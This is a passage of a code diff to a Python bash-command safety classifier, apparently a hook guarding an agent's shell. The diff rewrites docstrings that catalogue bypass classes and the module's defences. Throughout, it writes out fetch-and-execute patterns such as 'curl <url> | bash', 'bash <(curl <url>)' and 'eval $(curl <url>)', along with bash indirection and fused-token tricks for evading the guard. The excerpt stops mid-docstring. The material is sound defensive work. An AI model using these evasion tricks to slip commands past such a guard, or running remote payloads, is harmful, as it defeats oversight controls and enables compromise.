@@ -39,259 +39,153 @@ fused variable, or an array-literal-assignment indirection) still
 evades Stage 1. Full closure requires Stage 2 (execution-boundary
 enforcement), tracked separately per #1326's own stated scope boundary.
 
-Closed by Step 8 independent review, ninth round (issue #1326), ported
-from the sibling module's own fix of the same finding: bash's own
-`${NAME:-default}`/`${NAME-default}`/`${NAME:=default}`/`${NAME=default}`
-parameter expansion evaluates to the literal DEFAULT text whenever NAME
-is unset (or, for the `:`-prefixed forms, empty) -- a zero-assignment
-mechanism for embedding literal text directly in a token. Before this
-fix, `_rule_b1a_dynamic_word_same_segment_verb`/`_rule_b1b_dynamic_word_
-assigned_tool_and_verb`/`_rule_gh_any`/`_rule_git_push` all only ever
-looked at a literal token's own text or a referenced variable's assigned
-value, never a token's own embedded default-clause text --
-`${NEVER_SET:-uv} ${NEVER_SET2:-install} foo` (confirmed via real bash
-argv expansion to resolve to a genuine `uv install foo`) and
-`${NEVER_SET:-git} ${NEVER_SET2:-push} origin main` needed NO variable
-assignment anywhere in the command at all. Closed via
-`_default_clause_literal` (an anchored, whole-token extraction), wired
-into all four rules above as an additional source of "value" alongside a
-referenced variable's own assigned value.
+Bypass classes and false-positive traps this module defends against,
+each stated as the current behavior (see the named helpers for detail):
 
-Closed by Step 8 independent review, tenth round (issue #1326), ported
-from the sibling module's own fix of the same two findings:
-
-  1. Bash's own `${!NAME}` indirect-reference syntax is a TWO-LEVEL
-     lookup -- NAME's own assigned value names a SECOND variable, and the
-     whole expression evaluates to THAT variable's own assigned value
-     (`GREF=G; G=gh; ${!GREF} pr merge 1` resolves, at real bash's own
-     runtime, to a genuine `gh pr merge 1`, defeating the absolute gh
-     hard-deny). Before this fix, none of this module's indirection
-     machinery recognized this syntax at all. Closed via
-     `_resolve_indirect_ref` (wired into B1a/B1b and additively into
-     `_rule_gh_any`/`_rule_git_push`, alongside their existing
-     multi-reference collection logic) plus a new `_assigned_raw_values`
-     map: the first-level lookup needs NAME's assigned value as a
-     CASE-PRESERVED key into the second lookup (bash variable names are
-     case-sensitive), so it cannot reuse the existing
-     `_assigned_literals`/`name_to_value` map, which intentionally
-     lowercases every RHS for this module's other, case-insensitive
-     tool/verb comparisons.
-  2. `_rule_npx`/`_rule_bare_install`/`_rule_fetch_exec` previously
-     checked only a token's own literal text, with NO indirection
-     handling of any kind -- `N=npx; $N left-pad` (real bash: `npx
-     left-pad`) bypassed npx detection entirely, and the equivalent
-     bare-`$VAR`/default-clause/`${!NAME}` forms bypassed the other two
-     rules the same way. Closed via a new unifying `_resolve_dynamic_
-     token` helper (tries, in order: a bare `$NAME`/`${NAME}` reference
-     via a newly-ported `_resolve_bare_var`, then `_default_clause_
-     literal`, then `_resolve_indirect_ref`) shared by all three rules.
-
-Closed by Step 8 independent review, eleventh round (issue #1326),
-superseding both the ninth- and tenth-round fixes described above: every
-one of `_default_clause_literal`, `_resolve_indirect_ref`,
-`_resolve_bare_var`, and `_resolve_dynamic_token` requires the ENTIRE
-token to be exactly one recognized construct -- sound for that shape
-alone, but blind to the same construct FUSED with literal text in the
-same token (e.g. `in${!SUFREF}`, reconstructing to "install" once SUFREF
-resolves two levels to "stall"). Confirmed live via real bash argv
-expansion: `T=uv; SUFNAME=SUFVAL; SUFVAL=stall; $T in${!SUFNAME} foo`
-resolves to a genuine `uv install foo`; `HSUF=HVAL; HVAL=h; g${!HSUF} pr
-merge 1` resolves to a genuine `gh pr merge 1` (defeating the absolute gh
-hard-deny); `NSUF=NVAL; NVAL=px; n${!NSUF} left-pad` resolves to a
-genuine `npx left-pad` -- none of B1a/B1b, `_rule_gh_any`,
-`_rule_git_push`, `_rule_npx`, `_rule_bare_install`, or `_rule_fetch_exec`
-caught any of these before this fix. Closed by porting
-`_substitute_var_refs_candidates` (and its own supporting
-`_VAR_REF_FULL_RE`/`_unbraced_ref_options`/`_MAX_SUBSTITUTION_CANDIDATES`)
-from the sibling module for the first time this round -- it already
-handled every reference shape this module recognizes, fused or not, via
-its own non-anchored regex, since the gh-api value path in the sibling
-module needed exactly this generality starting at its own eighth round.
-Every rule above now calls it directly instead of a narrower, anchored
-subset of the same resolution logic, which made `_default_clause_
-literal`, `_resolve_indirect_ref`, `_resolve_bare_var`,
-`_resolve_dynamic_token`, and the module-level `_VAR_REF_RE` all fully
-unused, so all five were removed rather than left as dead code. (The
-sibling module kept `_resolve_bare_var`/`_resolve_indirect_ref` in active
-use a little longer, for its own gh-api flag-NAME resolution -- see that
-module's own twelfth-round paragraph below for why even that narrower
-use turned out to be unsound, and was itself removed.)
-
-Closed by twelfth-round Step 8 independent review, a finding exclusive
-to this file (the sibling module has no `_rule_fetch_exec`/curl-wget
-detection at all): `_rule_fetch_exec` only ever checked the ONE segment
-immediately following a curl/wget segment, then unconditionally stopped
-scanning -- a content-preserving passthrough stage between the fetch and
-the interpreter (`curl <url> | cat | bash`, `| tee /dev/null | bash`)
-still carries the payload through unmodified, confirmed live via real
-bash that `cat <script> | cat | bash` genuinely executes the script, but
-was invisible to this rule entirely. The SAME operator-blind design also
-produced a false positive in the other direction: `curl <url>; bash
-unrelated.sh` -- a plain SEQUENCED statement, not a pipe -- was wrongly
-denied, since `;` and `|` were never distinguished by `segment_tokens`'s
-own flat, operator-blind segment list. Closed by adding `_pipe_chains`, a
-new tokenizer-level grouping that keeps `|`-connected segments in the
-same chain while breaking apart at every other STATEMENT-separating
-operator, and rewriting `_rule_fetch_exec` to check every later segment
-within the same chain (not just the first) while never crossing into an
-unrelated chain.
-
-Closed by thirteenth-round Step 8 independent review, two further
-findings in this same area: (1) `_pipe_chains` initially lumped `(`/`)`
-in with the statement-separator operators too, but they are bash's own
-SUBSHELL grouping syntax, not a separator -- a subshell's combined
-stdout still flows onward through a `|` that follows its closing `)`, so
-`(curl <url> | cat) | bash` (confirmed live via a real bash proxy) is one
-continuous pipe, not two unconnected ones; treating `(`/`)` as
-STATEMENT-breaking silently split that one real chain in two, so
-`_rule_fetch_exec` never saw the interpreter as part of the same chain as
-`curl` at all -- closed by treating `(`/`)` as fully transparent instead
-(skipped, never starting or breaking a chain). (2) `_rule_fetch_exec`'s
-own `sudo`-skip only ever recognized a BARE `sudo` token, so `curl <url>
-| sudo -E bash` (confirmed live via real bash argv expansion to
-genuinely run `bash` under `sudo`) bypassed detection while plain `curl
-<url> | sudo bash` was already caught -- closed by also skipping any
-number of boolean (no-separate-value) flag-shaped tokens after `sudo`; a
-sudo flag taking a separate value argument (`-u root`) is a disclosed,
-narrower-than-full-parsing residual. Also consolidated `_rule_npx`,
-which had not yet been converted to the `_resolve_seg_tokens_candidates`
-helper introduced the round before, onto that same shared primitive.
-
-Closed by fourteenth-round Step 8 independent review, six further
-findings, all in or adjacent to `_pipe_chains`/`_rule_fetch_exec`: (1)
-`|&` (pipe both stdout and stderr) tokenizes as two adjacent tokens `|`
-then `&`, and the pre-fix `_pipe_chains` treated the trailing `&` as an
-ordinary statement-separator, wrongly breaking the chain right where
-`|&` continues it -- closed by consuming the following `&` as part of
-the same `|`. (2) A statement separator found INSIDE an unclosed
-subshell still broke the chain at the top level, even though a
-subshell's combined stdout genuinely flows onward through a following
-`|` (confirmed live via a real bash proxy) -- closed by tracking
-paren-nesting depth, so a depth>0 separator starts a new SEGMENT in the
-SAME chain (like `|` already does) instead of a new chain. (3) Process
-substitution (`<(...)`/`>(...)`) was invisible to every rule -- `<` was
-not one of `_pipe_chains`'/`segment_tokens`'s own control-operator
-tokens, so `bash <(curl <url>)` (confirmed live via a real bash proxy)
-was never recognized as a fetch-and-exec pattern at all -- closed by
-`_rule_process_sub_fetch_exec`, a new, narrow check for an interpreter
-segment whose own argument opens a `<(`/`>(` span headed by curl/wget.
-(4) `_rule_fetch_exec`'s wrapper-skip only ever recognized `sudo` --
-`env`/`command`/`exec` prepend an interpreter the identical way, but
-were not recognized at all -- closed by widening `_FETCH_EXEC_WRAPPERS`
-and factoring the skip logic into a shared `_skip_fetch_exec_wrapper`
-helper. (5) A command substitution (`$(...)`) embedded in another
-command was invisible to every rule in the classifier -- `_is_dynamic`
-marks the whole span dynamic, but `_substitute_var_refs_candidates`
-never matches its shape, so it flowed through as unmodified, never-
-matching literal text instead of being treated as unresolved. This
-surfaced as TWO distinct live bypasses needing TWO distinct fixes,
-neither sufficient alone: a genuine REGRESSION (confirmed via a direct
-diff against the pre-fourteenth-round module) where `echo $(curl <url> |
-bash)` was correctly denied before this round's own subshell-parens-
-transparency-adjacent tokenizer state and stopped being denied once
-raw `$`/`(`/`|`/`)` tokens leaked into the outer command's pipe-chain
-analysis -- closed by `_fold_command_substitution_spans` (a new
-tokenizer pass folding each `$(...)` span into one opaque, always-
-dynamic token BEFORE segmenting/pipe-chain analysis run) plus `_rule_
-command_substitution_content` (recursively classifies each span's own
-inner tokens, since folding alone makes the danger INSIDE a
-substitution invisible to the outer command's own rule dispatch); and a
-general literal-token-adjacency bypass (`$(echo pip) install foo`,
-confirmed live via a real bash proxy that the substitution genuinely
-resolves to `pip install foo`) where the SAME pre-fold paren-splitting
-put a tool name and its verb in two different segments -- folding closes
-this one directly, by keeping the verb in the SAME segment as the now-
-opaque, dynamic command word. An early version of `_fold_command_
-substitution_spans` also special-cased `_substitute_var_refs_
-candidates` itself to fail closed on ANY `$(` -- this over-broadened
-the fail-closed behavior into whole-segment scanners (`_rule_npx`,
-B1a/B1b) that resolve EVERY dynamic token in a segment: `echo "today is
-$(date)"` (confirmed live: harmless) was wrongly denied, since the
-`$(date)` ARGUMENT -- not the command word -- made the whole scan
-unresolvable. Reverted; closed instead via the narrower, position-
-specific `_is_unresolvable_substitution` guard, used only at the exact
-rules that check ONE security-relevant token position (`_rule_gh_any`,
-`_rule_bare_install`, `_rule_fetch_exec`, `_rule_process_sub_fetch_
-exec`), each additionally excluding an assignment-shaped token (`X=`) --
-`x=$(date +%s); echo $x` (confirmed live: harmless) was wrongly denied
-by the position-specific guard's own first version, since a bare,
-standalone assignment's RHS is not a command word being invoked at all.
-(6) `eval $(curl <url>)` and `bash -c "$(curl <url>)"` (confirmed live
-via a real bash proxy) feed a fetched payload's OUTPUT directly to
-eval/an interpreter's `-c` flag as the command text to run -- distinct
-from both the recursive inner-content check (this substitution's own
-inner content, `curl <url>` alone, is harmless) and the piped/process-
-substitution checks above (no pipe, no `<(`); closed by `_rule_eval_or_
-dashc_fetch_exec`, a new, narrow check recognizing only a LITERAL
-`eval`/interpreter-with-`-c` command word (a disclosed, narrower-than-
-full-parsing residual, consistent with this module's own scoping
-elsewhere) followed by a `$(...)` argument headed by curl/wget.
-
-Closed by fifteenth-round Step 8 independent review, four further
-findings, all severe (each needs no indirection technique at all -- the
-denied tool name is present as its own untouched literal token in the
-command): (1) Bash's own simple-command grammar lets zero or more
-`NAME=value` environment-assignment tokens precede the actual command
-word (`X=foo gh pr merge 1`, ordinary syntax, not a technique) -- every
-`seg[0]`-anchored rule (`_rule_gh_any`, `_rule_bare_install`, `_rule_
-fetch_exec`, `_rule_process_sub_fetch_exec`, `_rule_eval_or_dashc_fetch_
-exec`, B1a/B1b's own `_is_dynamic(seg[0])` gate, B2) implicitly assumed
-`seg[0]` always IS the command word, and this predates this round's own
-work entirely (confirmed via `git show fab856a:...` against the very
-first Stage 1 commit). Closed by `_strip_leading_assignments`, applied
-ONCE, uniformly, to every segment in `_classify_tokens` before any rule
-runs. (2) A token with TWO fused `$(...)` substitutions (`"$(echo ok)
-$(curl <url> | bash)"`, one token after shlex's own quote removal) only
-ever had its FIRST span scanned -- the second's genuinely dangerous
-content was never recursively classified at all. Closed by threading a
-`search_from` parameter through `_find_fused_command_substitution` so
-`_rule_command_substitution_content` loops until no more spans remain in
-the same token, not just once. (3) The main hook's own `is_git_push`
-warn-only signal was silently dropped for a `$(...)`-wrapped git push
-(`x=$(git push origin main)`) -- `_rule_command_substitution_content`
-only ever propagated `is_git_push` alongside a hard DENY, but `git push`
-alone is warn-only there, so the recursive check's own early-return-
-only-on-deny discarded the signal whenever the inner verdict wasn't
-itself denied. Closed by scanning unconditionally and OR-ing every
-span's own `is_git_push` into a running total (task-file-specific: this
-module has no `is_git_push` field at all, so this finding did not apply
-here). (4) Bash's own array-literal syntax (`NAME=(elem1 elem2)`) is
-indistinguishable, from the token stream alone, from an empty assignment
-immediately followed by an unrelated subshell -- `files=($(ls *.txt))`,
-an ordinary idiom capturing a command's output into an array, was wrongly
-denied once the array's own element list became `seg[0]` of its own
-segment. Closed by `_fold_array_literal_spans`, folding the whole span
-into one token (still `NAME=`-shaped, so `_strip_leading_assignments`
-removes it entirely) BEFORE segmenting -- an earlier version tried to
-reconcile this AFTER segmenting/pipe-chain-building instead, which
-`_pipe_chains`'s own transparent-parens treatment of `(` (never splitting
-the array apart in the first place) defeated from a second angle.
-Separately, `_rule_eval_or_dashc_fetch_exec` was rewritten to operate on
-the RAW, un-folded token stream via a new `_command_spans` helper: the
-prior version re-`tokenize`d a folded token's own space-joined
-reconstruction to recover a `$(...)` argument's inner tokens, and a
-quote character inside that argument (`eval $(echo "it's fine")`,
-confirmed live: harmless) became, once reconstructed, an unterminated
-quote -- wrongly denied with a misleading reason.
-
-Closed by issue #1350, filed separately from #1326 (a materially
-different bypass shape -- segment-boundary loss, not verb-token-
-splitting), ported from the sibling module's own fix of the same finding:
-`segment_tokens`'s own `_SINGLE_OPS` set was written from the start to
-include a literal newline, showing clear intent to treat it as a real
-bash statement separator exactly like `;` -- but `tokenize()`'s own shlex
-configuration silently absorbed a bare newline as ordinary whitespace
-instead of ever emitting it as a token, making that `"\n"` member
-unreachable dead code. Live-verified directly against this module's own
-`classify()`: `echo hi\ngh pr merge 1` (two real bash statements on
-separate lines) returned `deny=False` here -- this module's absolute,
-`seg[0]`-anchored `gh` detection has no phrase-list adjacency fallback the
-way the sibling module's own literal-scan rule does, so `gh` sitting at
-index 2 of one flat, newline-collapsed segment was never seen. See
-`tokenize()`'s and `_strip_line_continuations`'s own docstrings for the
-full live-verified fix, covering both the statement-separator gap itself
-and a second, related gap the fix's own verification against the
-backslash-newline continuation case turned up along the way.
+  - Bash's `${NAME:-default}`/`${NAME-default}`/`${NAME:=default}`/
+    `${NAME=default}` parameter expansion evaluates to the literal
+    DEFAULT text whenever NAME is unset (or, for the `:`-prefixed forms,
+    empty) -- a zero-assignment mechanism for embedding literal text
+    directly in a token: `${NEVER_SET:-uv} ${NEVER_SET2:-install} foo`
+    expands under real bash to a genuine `uv install foo` with no
+    variable assignment anywhere in the command.
+  - Bash's `${!NAME}` indirect-reference syntax is a TWO-LEVEL lookup:
+    NAME's own assigned value names a SECOND variable, and the whole
+    expression evaluates to THAT variable's own assigned value (`GREF=G;
+    G=gh; ${!GREF} pr merge 1` resolves, at real bash's own runtime, to
+    a genuine `gh pr merge 1`). The first-level lookup needs NAME's
+    assigned value as a CASE-PRESERVED key into the second lookup (bash
+    variable names are case-sensitive), which is why the
+    `_assigned_raw_values` map exists alongside `_assigned_literals`/
+    `name_to_value`, whose RHS values are intentionally lowercased for
+    this module's other, case-insensitive tool/verb comparisons.
+  - Either construct above can be FUSED with literal text in the same
+    token: `T=uv; SUFNAME=SUFVAL; SUFVAL=stall; $T in${!SUFNAME} foo`
+    resolves under real bash to a genuine `uv install foo`; `g${!HSUF}`
+    can reconstruct `gh`, `n${!NSUF}` can reconstruct `npx`. All
+    reference resolution therefore goes through
+    `_substitute_var_refs_candidates` (with its supporting
+    `_VAR_REF_FULL_RE`/`_unbraced_ref_options`/
+    `_MAX_SUBSTITUTION_CANDIDATES`), whose non-anchored regex handles
+    every recognized reference shape, fused or not; earlier anchored,
+    whole-token-only helpers (`_default_clause_literal`,
+    `_resolve_indirect_ref`, `_resolve_bare_var`,
+    `_resolve_dynamic_token`, `_VAR_REF_RE`) were superseded by it and
+    removed rather than left as dead code.
+  - A content-preserving passthrough stage between a fetch and an
+    interpreter (`curl <url> | cat | bash`, `| tee /dev/null | bash`)
+    carries the payload through unmodified, so `_rule_fetch_exec` checks
+    every later segment within the same pipe chain, not just the one
+    immediately after the fetch. The chain grouping lives in
+    `_pipe_chains`, a tokenizer-level pass that keeps `|`-connected
+    segments in the same chain while breaking apart at every other
+    STATEMENT-separating operator -- so a plain SEQUENCED statement
+    (`curl <url>; bash unrelated.sh`) is not misread as a pipe and
+    wrongly denied.
+  - `(`/`)` are bash's SUBSHELL grouping syntax, not statement
+    separators: a subshell's combined stdout still flows onward through
+    a `|` that follows its closing `)`, so `(curl <url> | cat) | bash`
+    is one continuous pipe, not two unconnected ones. `_pipe_chains`
+    treats `(`/`)` as fully transparent (skipped, never starting or
+    breaking a chain), and tracks paren-nesting depth so a statement
+    separator INSIDE an unclosed subshell starts a new SEGMENT in the
+    SAME chain (like `|` does) instead of a new chain.
+  - `|&` (pipe both stdout and stderr) tokenizes as two adjacent tokens
+    `|` then `&`; `_pipe_chains` consumes the following `&` as part of
+    the same `|`, rather than treating it as a statement separator that
+    would break the chain right where `|&` continues it.
+  - Wrappers prepend an interpreter without changing what runs: `curl
+    <url> | sudo -E bash` genuinely runs `bash` under `sudo`, and
+    `env`/`command`/`exec` behave the same way. `_skip_fetch_exec_
+    wrapper` (over `_FETCH_EXEC_WRAPPERS`) skips the wrapper token plus
+    any number of boolean (no-separate-value) flag-shaped tokens after
+    it; a flag taking a separate value argument (`sudo -u root`) is a
+    disclosed, narrower-than-full-parsing residual.
+  - Process substitution (`<(...)`/`>(...)`) is a fetch-and-exec shape
+    with no pipe at all -- `bash <(curl <url>)` genuinely executes the
+    fetched script, and `<` is not one of the control-operator tokens
+    `_pipe_chains`/`segment_tokens` split on. `_rule_process_sub_fetch_
+    exec` is a narrow check for an interpreter segment whose own
+    argument opens a `<(`/`>(` span headed by curl/wget.
+  - A command substitution (`$(...)`) embedded in another command is
+    dynamic content `_substitute_var_refs_candidates` never matches, so
+    without special handling it flows through as unmodified, never-
+    matching literal text. Two complementary mechanisms handle it:
+    `_fold_command_substitution_spans` folds each `$(...)` span into one
+    opaque, always-dynamic token BEFORE segmenting/pipe-chain analysis
+    (otherwise raw `$`/`(`/`|`/`)` tokens leak into the outer command's
+    pipe-chain analysis -- `echo $(curl <url> | bash)` -- and the
+    pre-fold paren-splitting can put a tool name and its verb in two
+    different segments -- `$(echo pip) install foo`, which genuinely
+    resolves to `pip install foo`); and `_rule_command_substitution_
+    content` recursively classifies each span's own inner tokens, since
+    folding alone makes the danger INSIDE a substitution invisible to
+    the outer command's own rule dispatch. Failing closed on ANY `$(`
+    inside `_substitute_var_refs_candidates` itself would over-broaden
+    into whole-segment scanners (`_rule_npx`, B1a/B1b) that resolve
+    EVERY dynamic token in a segment -- `echo "today is $(date)"` is
+    harmless, and its `$(date)` ARGUMENT (not the command word) would
+    make the whole scan unresolvable -- so the fail-closed behavior
+    lives instead in the narrower, position-specific
+    `_is_unresolvable_substitution` guard, used only at the exact rules
+    that check ONE security-relevant token position (`_rule_gh_any`,
+    `_rule_bare_install`, `_rule_fetch_exec`, `_rule_process_sub_fetch_
+    exec`), each additionally excluding an assignment-shaped token
+    (`X=`): a bare, standalone assignment's RHS (`x=$(date +%s); echo
+    $x`, harmless) is not a command word being invoked at all.
+  - `eval $(curl <url>)` and `bash -c "$(curl <url>)"` feed a fetched
+    payload's OUTPUT directly to eval/an interpreter's `-c` flag as the
+    command text to run -- distinct from both the recursive
+    inner-content check (this substitution's own inner content, `curl
+    <url>` alone, is harmless) and the piped/process-substitution checks
+    above (no pipe, no `<(`). `_rule_eval_or_dashc_fetch_exec`
+    recognizes only a LITERAL `eval`/interpreter-with-`-c` command word
+    (a disclosed, narrower-than-full-parsing residual, consistent with
+    this module's own scoping elsewhere) followed by a `$(...)` argument
+    headed by curl/wget. It operates on the RAW, un-folded token stream
+    via the `_command_spans` helper: re-`tokenize`-ing a folded token's
+    own space-joined reconstruction turns a quote character inside the
+    argument (`eval $(echo "it's fine")`, harmless) into an unterminated
+    quote and a wrong deny with a misleading reason.
+  - Bash's own simple-command grammar lets zero or more `NAME=value`
+    environment-assignment tokens precede the actual command word
+    (`X=foo gh pr merge 1`, ordinary syntax, not a technique), so no
+    `seg[0]`-anchored rule (`_rule_gh_any`, `_rule_bare_install`,
+    `_rule_fetch_exec`, `_rule_process_sub_fetch_exec`, `_rule_eval_or_
+    dashc_fetch_exec`, B1a/B1b's own `_is_dynamic(seg[0])` gate, B2) may
+    assume `seg[0]` always IS the command word.
+    `_strip_leading_assignments` is applied ONCE, uniformly, to every
+    segment in `_classify_tokens` before any rule runs.
+  - A token with TWO fused `$(...)` substitutions (`"$(echo ok) $(curl
+    <url> | bash)"`, one token after shlex's own quote removal) needs
+    EVERY span scanned, not just the first -- `_rule_command_
+    substitution_content` loops via `_find_fused_command_substitution`'s
+    `search_from` parameter until no more spans remain in the same
+    token. (The sibling module additionally propagates a warn-only
+    `is_git_push` signal out of substitution spans; this module has no
+    `is_git_push` field at all, so no equivalent exists here.)
+  - Bash's own array-literal syntax (`NAME=(elem1 elem2)`) is
+    indistinguishable, from the token stream alone, from an empty
+    assignment immediately followed by an unrelated subshell --
+    `files=($(ls *.txt))`, an ordinary idiom capturing a command's
+    output into an array, must not be denied once the array's own
+    element list becomes `seg[0]` of its own segment.
+    `_fold_array_literal_spans` folds the whole span into one token
+    (still `NAME=`-shaped, so `_strip_leading_assignments` removes it
+    entirely) BEFORE segmenting; reconciling AFTER segmenting/pipe-
+    chain-building does not work, because `_pipe_chains`'s own
+    transparent-parens treatment of `(` never splits the array apart in
+    the first place.
+  - A bare newline is a real bash statement separator exactly like `;`,
+    but shlex's default configuration silently absorbs it as ordinary
+    whitespace instead of emitting it as a token -- collapsing `echo hi`
+    and `gh pr merge 1` on separate lines into one flat segment where
+    this module's absolute, `seg[0]`-anchored `gh` detection (which has
+    no phrase-list adjacency fallback the way the sibling module's own
+    literal-scan rule does) never sees `gh` sitting at index 2. See
+    `tokenize()`'s and `_strip_line_continuations`'s own docstrings for
+    the fix, covering both the statement-separator gap itself and a
+    second, related backslash-newline continuation gap.
 
 Deliberately stdlib-only (shlex, re, json).
 """
@@ -307,10 +201,9 @@ from typing import NamedTuple
 # shlex's own default punctuation set under punctuation_chars=True
 # ('();<>|&'), plus a literal newline -- passed as an explicit string to
 # `shlex.shlex` in `tokenize()` below, rather than relying on the `True`
-# shortcut, specifically so newline can join it (issue #1350: see
-# `tokenize()`'s own docstring for why the `True` shortcut alone leaves
-# this set's own "\n" member unreachable). Ported from hooks/gitapex_
-# check_bash_safety.py's own fix of the same finding.
+# shortcut, specifically so newline can join it (see `tokenize()`'s own
+# docstring for why the `True` shortcut alone leaves this set's own "\n"
+# member unreachable).
 _SINGLE_OPS = {";", "|", "&", "(", ")", "\n"}
 _MULTI_OPS = {"&&", "||"}
 _ASSIGN_RE = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$")
@@ -320,8 +213,7 @@ _ASSIGN_RE = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$")
 # that span -- unlike an anchored, whole-token-only match, this is found
 # fused within a larger token too (e.g. `-X${NAME-POST}`, `in${!NAME}`).
 # Ported verbatim from hooks/gitapex_check_bash_safety.py's own
-# `_VAR_REF_FULL_RE` (see that module's own docstring for the full
-# root-cause history across rounds 8-10 that arrived at this shape).
+# `_VAR_REF_FULL_RE`.
 _VAR_REF_FULL_RE = re.compile(
     r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}"
     r"|\$\{([A-Za-z_][A-Za-z0-9_]*):?[-=]([^}]*)\}"
@@ -363,36 +255,28 @@ def _substitute_var_refs_candidates(
     unresolved but plausible, i.e. fail closed) if the combinatorial
     expansion below would exceed `_MAX_SUBSTITUTION_CANDIDATES`. Ported
     verbatim from hooks/gitapex_check_bash_safety.py's own function of the
-    same name -- see that module's own docstring for the full
-    round-by-round derivation (rounds 5-10) of why this general,
-    fusion-aware resolver is needed instead of a whole-token-anchored
-    point-fix per reference shape.
+    same name.
 
-    Found live by Step 8 independent review, eleventh round (issue
-    #1326): this file's own B1a/B1b, `_rule_gh_any`, `_rule_git_push`,
-    `_rule_npx`, `_rule_bare_install`, and `_rule_fetch_exec` each relied
-    on a NARROWER, whole-token-anchored resolver (`_default_clause_
-    literal`, `_resolve_indirect_ref`, `_resolve_bare_var`, or the
-    now-removed `_resolve_dynamic_token` wrapping all three) that
-    requires the ENTIRE token to be exactly one recognized construct --
-    blind to that same construct FUSED with literal text in the same
-    token. Confirmed live via real bash argv expansion: `T=uv;
+    This general, fusion-aware resolver is needed instead of a
+    whole-token-anchored point-fix per reference shape: an anchored
+    resolver that requires the ENTIRE token to be exactly one recognized
+    construct is blind to that same construct FUSED with literal text in
+    the same token. Under real bash argv expansion, `T=uv;
     SUFNAME=SUFVAL; SUFVAL=stall; $T in${!SUFNAME} foo` resolves to a
     genuine `uv install foo`, `HSUF=HVAL; HVAL=h; g${!HSUF} pr merge 1`
     resolves to a genuine `gh pr merge 1` (defeating the *absolute* gh
-    hard-deny), and `NSUF=NVAL;
-    NVAL=px; n${!NSUF} left-pad` resolves to a genuine `npx left-pad` --
-    all three fully bypassed this file's own detection before this fix.
-    This function was ported here for the first time this round (it
-    already existed in the sibling module since round 8) and every rule
-    above now calls it directly instead of a narrower, anchored
-    subset of the same resolution logic.
+    hard-deny), and `NSUF=NVAL; NVAL=px; n${!NSUF} left-pad` resolves to
+    a genuine `npx left-pad` -- so every rule that resolves a dynamic
+    token (B1a/B1b, `_rule_gh_any`, `_rule_git_push`, `_rule_npx`,
+    `_rule_bare_install`, `_rule_fetch_exec`) calls this function
+    directly rather than a narrower, anchored subset of the same
+    resolution logic.
 
     Deliberately does NOT special-case an embedded command substitution
-    (`$(...)`) or backtick substitution here -- ported from hooks/gitapex_
-    check_bash_safety.py's own fix of the same finding, see that module's
-    own docstring for the full round-14 root-cause history of the
-    collateral false positive an earlier version of this fix caused."""
+    (`$(...)`) or backtick substitution here: failing closed on ANY `$(`
+    at this shared layer would make whole-segment scanners deny harmless
+    commands whose substitution sits in an argument position -- see
+    `_is_unresolvable_substitution`'s own docstring."""
     partials = [""]
     pos = 0
     for match in _VAR_REF_FULL_RE.finditer(token):
@@ -476,9 +360,9 @@ def _command_substitution_token_span(tokens: list[str], i: int) -> int | None:
 
     Shared by `_fold_command_substitution_spans` (folds the span into one
     opaque token) and `_rule_command_substitution_content` (recursively
-    classifies the span's own inner tokens) -- factored out by Step 8
-    independent review, fourteenth round (issue #1326), so the two do not
-    grow independently-drifting copies of the identical paren-depth scan."""
+    classifies the span's own inner tokens) -- factored out so the two do
+    not grow independently-drifting copies of the identical paren-depth
+    scan."""
     if not (tokens[i].endswith("$") and i + 1 < len(tokens) and tokens[i + 1] == "("):
         return None
     depth = 1
@@ -509,15 +393,14 @@ def _find_fused_command_substitution(token: str, search_from: int = 0) -> tuple[
     function's).
 
     `search_from` lets a caller find EVERY fused span in a token with
-    more than one, not just the first -- found live by Step 8
-    independent review, fifteenth round (issue #1326): a token with TWO
-    fused substitutions (`"$(echo ok)$(curl <url> | bash)"`, one token
-    after shlex's own quote removal) only ever had its FIRST span
-    scanned by `_rule_command_substitution_content`'s own per-token loop,
-    which called this function once per token then moved on -- the
-    second substitution's genuinely dangerous content (confirmed live
-    via a real bash proxy that both spans execute regardless of quoting)
-    was never recursively classified at all."""
+    more than one, not just the first: a token with TWO fused
+    substitutions (`"$(echo ok)$(curl <url> | bash)"`, one token after
+    shlex's own quote removal) executes BOTH spans regardless of
+    quoting, so `_rule_command_substitution_content`'s own per-token
+    loop must call this function repeatedly, advancing `search_from`,
+    until no spans remain -- calling it once per token and moving on
+    would leave the second substitution's genuinely dangerous content
+    never recursively classified at all."""
     start = token.find("$(", search_from)
     if start == -1:
         return None
@@ -541,13 +424,14 @@ def _fold_command_substitution_spans(tokens: list[str]) -> list[str]:
     assignment, e.g. `X=$(...)`) into a single opaque token -- see
     `_command_substitution_token_span`'s own docstring for how the span's
     boundary is found. Ported from hooks/gitapex_check_bash_safety.py's
-    own function of the same name -- see that module's own docstring for
-    the full round-14 root-cause history (a genuine regression from this
-    module's own thirteenth round plus a general literal-token-adjacency
-    bypass) this closes together with `_rule_command_substitution_
-    content` and the narrow, position-specific `_is_unresolvable_
-    substitution` guards at each rule that checks ONE security-relevant
-    token position.
+    own function of the same name. Without this fold, raw `$`/`(`/`|`/`)`
+    tokens leak into the outer command's segment/pipe-chain analysis, and
+    the pre-fold paren-splitting can put a tool name and its verb in two
+    different segments (`$(echo pip) install foo` genuinely resolves to
+    `pip install foo`) -- a literal-token-adjacency bypass this closes
+    together with `_rule_command_substitution_content` and the narrow,
+    position-specific `_is_unresolvable_substitution` guards at each rule
+    that checks ONE security-relevant token position.
 
     Deliberately does NOT fold `<(...)`/`>(...)` (process/output
     substitution) the same way: `_rule_process_sub_fetch_exec`'s own
@@ -562,9 +446,7 @@ def _fold_command_substitution_spans(tokens: list[str]) -> list[str]:
     dashc_fetch_exec` below can re-extract and re-`tokenize` (a plain
     `"".join` of every token would fuse adjacent words together, e.g.
     `curl`+`https://x` into the unparseable `curlhttps://x`, silently
-    breaking that later re-parse -- found live by Step 8 independent
-    review, fourteenth round, while implementing that same round's fix
-    for `eval $(curl <url>)`/`bash -c "$(curl <url>)"`)."""
+    breaking that later re-parse)."""
     folded: list[str] = []
     i = 0
     n = len(tokens)
@@ -600,16 +482,13 @@ def _is_unresolvable_substitution(token: str) -> bool:
     candidates`/`_resolve_seg_tokens_candidates` primitives themselves,
     which whole-segment scanners (`_rule_npx`, `_rule_b1a_...`,
     `_rule_b1b_...`) also rely on to resolve EVERY dynamic token in a
-    segment. Found live by Step 8 independent review, fourteenth round
-    (issue #1326): an earlier version of this fix added the identical
-    check directly inside `_substitute_var_refs_candidates`, which made
